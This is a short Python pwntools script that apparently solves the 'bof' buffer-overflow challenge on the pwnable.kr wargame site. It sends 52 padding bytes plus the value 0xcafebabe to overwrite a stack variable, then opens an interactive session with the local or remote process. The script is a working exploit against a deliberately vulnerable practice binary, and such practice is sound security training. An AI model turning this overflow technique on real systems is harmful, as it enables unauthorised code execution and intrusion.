#!/usr/bin/python3

from pwn import *

exe = ELF('bof', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*func+40

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('pwnable.kr', 9000)
else:
        p = process(exe.path)

GDB()
sl(b"a" * 52 + p32(0xcafebabe))
p.interactive()
